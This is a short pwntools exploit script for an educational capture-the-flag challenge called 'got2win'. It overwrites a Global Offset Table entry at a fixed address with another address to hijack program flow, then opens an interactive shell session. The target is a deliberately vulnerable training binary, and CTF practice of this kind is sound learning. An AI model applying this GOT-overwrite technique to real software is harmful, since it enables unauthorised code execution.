import pwn

pwn.context.log_level = "debug"

p = pwn.process("got2win/got2win/share/chal")
# p = pwn.remote("edu-ctf.zoolab.org", 10004)

p.recvuntil(b"Overwrite addr: ")
p.sendline(str(0x404038).encode())

p.recvuntil(b"Overwrite 8 bytes value: ")
p.send(pwn.p64(0x4010c0))

p.recvuntil(b"Give me fake flag: ")

p.interactive()
